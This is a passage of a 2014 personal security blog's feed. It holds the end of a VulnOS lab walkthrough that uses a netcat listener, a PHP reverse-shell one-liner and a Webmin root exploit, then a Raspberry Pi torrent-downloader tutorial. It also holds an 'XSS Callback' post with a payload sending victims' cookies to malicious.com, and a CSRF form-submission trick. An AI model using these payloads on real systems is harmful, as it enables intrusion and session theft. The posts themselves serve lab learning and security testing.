<p>And here is the output of the table <strong>user</strong> in <strong>Mysql</strong> database.</p>

<p><img src="http://paulsec.github.io/images/vulnos/mysql_users.png" width="75%" height="75%"/></p>

<h4>Access maintenance</h4>

<p>I decided to check Damn Vulnerable Web App at the address : <a href="http://192.168.56.105/DVWA-1.0.8/">http://192.168.56.105/DVWA-1.0.8/</a>
You can log in the page using the installation&rsquo;s credentials : admin/password.</p>

<p>Then, disable <strong>&ldquo;High&rdquo;</strong> security and you can do Remote Command Execution.
It&rsquo;s time to get a reverse shell !</p>

<p>On your machine, type :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 1337</span></code></pre></td></tr></table></div></figure>


<p>Because the Netcat version which is on the VM does not contain the <strong>-e</strong> option, I found a nice trick using PHP :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
</span></code></pre></td></tr></table></div></figure>


<p>However, we don&rsquo;t have enough access&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>


<p>Then, Thanks to D4rk, I created a cgi script in DVWA&rsquo;s folder:</p>

<p><img src="http://paulsec.github.io/images/vulnos/script_cgi.png" /></p>

<p>Using Webmin&rsquo;s exploit, just change <em>RPATH</em> to the new file and <strong>exploit</strong>.</p>

<p><img src="http://paulsec.github.io/images/vulnos/webmin_root_script_result.png" width="75%" height="75%"/></p>

<p>Hope you liked it and that you learnt something. :&ndash;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python + Transmission-daemon = Download easily your favorite TV Show]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show/"/>
    <updated>2014-03-28T18:23:59+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show</id>
    <content type="html"><![CDATA[<p>This post is about my last project : my <em>TV Show Manager</em>.</p>

<p>I decided to start it because I wanted something <strong>really</strong> simple to download my favorite TV Shows.
In this post, I&rsquo;ll explain step by step how to reproduce it at home.</p>

<p>Basically, with this tutorial you&rsquo;ll set up your <strong>Raspberry</strong> box by :</p>

<ul>
<li>Installing / set-uping transmission-daemon</li>
<li>Getting one of my latest project <a href="https://github.com/PaulSec/TVShowsManager">TVShowManager</a> that uses my <a href="https://github.com/PaulSec/eztv_api">EZTV Python API</a>.</li>
</ul>


<blockquote><p>Well.. let&rsquo;s start ?</p></blockquote>

<p>I&rsquo;m a <strong>Raspberry Pi</strong> enthusiast, so this project runs at home on a basic installation of <em>Raspbmc</em>.</p>

<p>First, you need to install <strong>transmission-remote</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo apt-get install transmission-daemon
</span></code></pre></td></tr></table></div></figure>


<p>The basic installation will launch a basic HTTP server.
Let&rsquo;s imagine the IP of your Raspberry server is : <strong>192.168.0.12</strong>.</p>

<p>The HTTP Server is accessible on the port 9091, like : <a href="http://192.168.0.12:9091/transmission/web/">http://192.168.0.12:9091/transmission/web/</a></p>

<p>To access this URL, there will be a .htaccess asking some credentials to access the page.</p>

<p>To display/update them, just access the settings.json configuration file :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo vim /etc/transmission-daemon/settings.json
</span></code></pre></td></tr></table></div></figure>


<p>And check for the variables <strong>rpc-username</strong> and <strong>rpc-password</strong>.
Moreover, if you want to send commands over the network, check the <strong>rpc-whitelist</strong> variable and add your private network range if you want to access it over the LAN, like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="s2">&quot;rpc-whitelist&quot;</span><span class="err">:</span> <span class="s2">&quot;127.0.0.1, 192.168.1.*&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, restart your transmission-daemon:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>killall -HUP transmission-da
</span></code></pre></td></tr></table></div></figure>


<blockquote><p>After setting up Transmission-remote, what do we have to do ?</p></blockquote>

<p>Well, you need to get TVShowManager, one of my project : <a href="git@github.com:PaulSec/TVShowsManager.git">TVShowManager</a>.</p>

<p>Start by cloning the projet by using <strong>git</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>git clone git@github.com:PaulSec/TVShowsManager.git
</span></code></pre></td></tr></table></div></figure>


<p>Then, just go in the folder and see the files which are present :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd </span>TVShowsManager <span class="o">&amp;&amp;</span> ls
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>eztv_api</strong> : (Unofficial) Python API for the website EZTV.it.</li>
<li><strong>TVShowsManager.py</strong> : the launcher for this project</li>
<li><strong>config.ini</strong> : the most important because it contains all the configuration !</li>
</ul>


<blockquote><p>Setting up TVShowsManager</p></blockquote>

<p>To use it, you have to create a configuration file called <strong>config.ini</strong>, let&rsquo;s take an example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>config<span class="o">]</span>
</span><span class='line'><span class="nv">username</span> <span class="o">=</span> myUsernameTr
</span><span class='line'><span class="nv">password</span> <span class="o">=</span> myPassword!!!
</span><span class='line'><span class="nv">ip</span> <span class="o">=</span> 192.168.0.12
</span><span class='line'><span class="nv">timer</span> <span class="o">=</span> 5
</span><span class='line'>
</span><span class='line'><span class="o">[</span>Vikings<span class="o">]</span>
</span><span class='line'><span class="nv">season</span> <span class="o">=</span> 1
</span><span class='line'><span class="nv">episode</span> <span class="o">=</span> 7
</span></code></pre></td></tr></table></div></figure>


<p>The first section is the <em><em>config</em></em> one.
You define different fields such as :</p>

<ul>
<li><em>Username</em>: Credentials to connect to your transmission.</li>
<li><em>Password</em>: Bis.</li>
<li><em>IP</em>: IP where your Transmission-remote is running</li>
<li><em>timer</em>: How many minutes you want to wait between 2 re-try.</li>
</ul>


<p>Then, the other sections are for your different tv show.
Based on this example, you&rsquo;re watching <em>Vikings</em> and stopped at the episode 7, season 1.</p>

<p>You can get those files on your Raspberry and the ip address will then be : <strong>127.0.0.1</strong> if transmission-daemon is running on it as well.</p>

<blockquote><p>Launch the app !</p></blockquote>

<p>To launch the app, after creating your own <strong>config.ini</strong> file, just type this command :</p>

<p><code>python TVShowsManager.py</code></p>

<p>And that&rsquo;s it !
If you want more details, I redacted a nice README for the project just <a href="https://github.com/PaulSec/TVShowsManager">here</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Callback]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/20/xss-callback/"/>
    <updated>2014-03-20T17:50:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/20/xss-callback</id>
    <content type="html"><![CDATA[<p>This post deals with a project I developed : <a href="https://github.com/PaulSec/XSS-Callback/">XSS Callback</a>.</p>

<p>This is not going to be (at least, I hope) a boring post about XSS exploitation. No.</p>

<p>Well, one scenario of using XSS would be to steal victim&rsquo;s cookie and access the page through his session.
This technique is called <strong>Session Hijacking</strong>. Ok fair enough.</p>

<p>However, some issues are present using this technique, let&rsquo;s take an example :</p>

<ul>
<li>You target a website</li>
<li>Unfortunately, it&rsquo;s too late (or too early depending on your situation) and you go to sleep.</li>
<li>You wake up in the night and there are loads of victims&rsquo;s sessions. Great !</li>
</ul>


<p>The only problem : the user <em>might have logged out of the platform</em> <strong>or</strong> there might be a <em>timeout on the session</em>.</p>

<p><strong>What would you do next ? </strong>
Well.. nothing much. You got lot of data but they are useless now.</p>

<p>I had the idea to create a basic HTTP Server using <em>Node.js</em> that will trigger a procedure when it will be called.
When launching this server, a route has been created which has this format :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//malicious.com/cookie/&lt;my-cookie&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok.. I guess you got it.</p>

<p>You can now insert some malicious payload like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://malicious.com/cookie/&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The cookie will be inserted in the URL and loaded on the client-side.
This means that you can go to sleep without any fear : All the victims who will load this URL will trigger an event on the server.
The server will then execute the code you developed on the server-side (and log user cookies if you want to).</p>

<p>Moreover, the idea of this code is completely generic that you can adapt for all web applications and the only thing you now have to do is : <strong>write your own</strong> <em>offensive</em> module.
You&rsquo;ll be able to launch the Node.js server with your own module using this command :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">node</span> <span class="nx">server</span><span class="p">.</span><span class="nx">js</span> <span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">my</span><span class="o">/</span><span class="nx">module</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using the strenght of Node.js and the amount of modules, you can manage to create any attack you want to perform really easily.</p>

<p>So.. hope you liked it and see you next time :&ndash;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dealing with HTML Submit's conflict]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict/"/>
    <updated>2014-03-09T21:49:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict</id>
    <content type="html"><![CDATA[<p>This first post is related with one of my project : CSRFT.
CSRFT is a Cross Site Request Forgery (CSRF) vulnerabilities Toolkit.</p>

<p>My toolkit allows you to exploit either GET and POST HTTP Requests.
During some testings, I had issues with some specific forms.</p>

<p>Let&rsquo;s take an example of such form :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://website.com/blog/&quot;</span> <span class="na">id=</span><span class="s">&quot;form&quot;</span> <span class="na">method=</span><span class="s">&quot;get&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;assistive-text&quot;</span> <span class="na">for=</span><span class="s">&quot;s&quot;</span><span class="nt">&gt;</span>Search<span class="nt">&lt;/label&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;field&quot;</span> <span class="na">id=</span><span class="s">&quot;s&quot;</span> <span class="na">name=</span><span class="s">&quot;s&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Search&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;Search Value&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;submit&quot;</span> <span class="na">id=</span><span class="s">&quot;searchsubmit&quot;</span> <span class="na">name=</span><span class="s">&quot;submit&quot;</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Search&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The code injected on the page to submit the form was like that :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, the form was not submitted.</p>

<h2>Why ?</h2>

<p>After browsing the internet, I found that there was a conflict with the <strong>submit</strong> input.</p>

<p>Let&rsquo;s try to debug wih <strong>FireBug</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="nx">TypeError</span><span class="o">:</span> <span class="nx">$</span><span class="p">(...).</span><span class="nx">submit</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">a</span> <span class="kd">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;searchsubmit&quot;</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Search&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As I said earlier, this is because there&rsquo;s a conflict with the <strong>Submit</strong> input.
When there&rsquo;s such input, it&rsquo;s then not possible to &ldquo;force&rdquo; the victim to send the payload.</p>

<h2>How to force submitting it ?</h2>

<p>To submit a form, you can use the <strong>native function</strong>.</p>

<p>Basic example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">HTMLFormElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">submit</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;forum&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>With such example, the argument of the function is the selector of the form.
Here, you submit the first form that you find in the DOM.
Using this technique, I&rsquo;ve been able to &ldquo;overwrite&rdquo; those (conflicts) inputs and submit the form even if it contains some.</p>

<p>Have fun !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Starting my own blog]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog/"/>
    <updated>2014-03-04T20:21:39+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog</id>
    <content type="html"><![CDATA[<p>Starting my own blog has been something I really wanted to do.
I&rsquo;ll add post related to my different projects but also on Web security.</p>

<p>Here are my different motivations :</p>

<h4>1. Provide a portfolio of my different projects.</h4>

<h4>2. Explain some problems I had and provide the solution</h4>

<h4>3. Talk about some geek stuffs. Let&rsquo;s see :)</h4>

<p>Hope you&rsquo;ll have fun to read me.
Cheers and see you soon.</p>
]]></content>
  </entry>
  
</feed>
